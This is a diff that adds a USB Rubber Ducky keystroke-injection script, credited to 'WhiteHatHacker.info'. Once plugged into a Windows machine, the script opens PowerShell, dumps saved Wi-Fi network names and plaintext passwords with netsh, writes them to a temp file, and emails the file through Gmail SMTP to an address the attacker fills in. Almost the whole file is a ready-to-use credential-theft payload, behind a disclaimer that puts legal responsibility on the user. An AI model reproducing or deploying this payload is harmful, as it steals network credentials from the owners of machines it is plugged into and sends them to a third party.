@@ -1,0 +1,88 @@
+REM Author: WhiteHatHacker.info
+REM Date: 29/01/2018
+REM Note: Thanks to all the help everyone!
+REM - - - - - - - - - - -
+REM - - - - - - - - - - - You take responsibility for any laws you break with this, I simply point out the security flaw
+REM start of script
+REM
+REM let the HID enumerate
+DELAY 1000
+CONTROL ESCAPE
+DELAY 500
+STRING powershell
+DELAY 500
+ENTER
+DELAY 300
+REM -------------go to Appdata
+STRING cd $Env:APPDATA
+ENTER
+REM -------------Run Powershell Script
+STRING $Wlan =  netsh wlan show profiles | Select-String -Pattern "All User Profile"
+ENTER
+STRING $Wlan1 = netsh wlan show profiles | Select-String -Pattern "All User Profile"
+ENTER
+STRING $Wlan2 = netsh wlan show profiles | Select-String -Pattern "All User Profile"
+ENTER
+STRING $Wlan3 = netsh wlan show profiles | Select-String -Pattern "All User Profile"
+ENTER
+STRING $Wlan4 = netsh wlan show profiles | Select-String -Pattern "All User Profile"
+ENTER
+STRING $Wlan5 = netsh wlan show profiles | Select-String -Pattern "All User Profile"
+ENTER
+DELAY 100
+STRING $WlanName = ($Wlan -split ":")[-1].Trim() -replace '"'
+ENTER
+STRING $WlanName1 = ($Wlan1 -split ":")[-3].Trim() -replace '"'
+ENTER
+STRING $WlanName2 = ($Wlan2 -split ":")[-5].Trim() -replace '"'
+ENTER
+STRING $WlanName3 = ($Wlan3 -split ":")[-7].Trim() -replace '"'
+ENTER
+STRING $WlanName4 = ($Wlan4 -split ":")[-9].Trim() -replace '"'
+ENTER
+STRING $WlanName5 = ($Wlan5 -split ":")[-11].Trim() -replace '"'
+ENTER
+DELAY 100
+STRING $WLanPass = netsh wlan show profiles $WlanName key=clear
+ENTER
+STRING $WLanPass1 = netsh wlan show profiles $WlanName1 key=clear
+ENTER
+STRING $WLanPass2 = netsh wlan show profiles $WlanName2 key=clear
+ENTER
+STRING $WLanPass3 = netsh wlan show profiles $WlanName3 key=clear
+ENTER
+STRING $WLanPass4 = netsh wlan show profiles $WlanName4 key=clear
+ENTER
+STRING $WLanPass5 = netsh wlan show profiles $WlanName5 key=clear
+ENTER
+STRING $WLanPass, $WLanPass1, $WLanPass2, $WLanPass3, $WLanPass4, $WLanPass5| Out-File "$env:TMP\WifiPassword.txt"
+ENTER
+DELAY 1000
+REM -------------email log via gmail
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUR E-MAIL ADDRESS', 'YOUR PASSWORD‘);
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'YOUR E-MAIL ADDRESS'
+ENTER
+STRING $ReportEmail.To.Add('YOUR E-MAIL ADDRESS')
+ENTER
+STRING $ReportEmail.Subject = 'Duck Report'
+ENTER
+STRING $ReportEmail.Body = 'Attached is your duck report.' 
+ENTER
+STRING $File = "$env:TMP\WifiPassword.txt"
+ENTER
+STRING $ReportEmail.Attachments.Add($File)
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 1000
+STRING exit
+ENTER
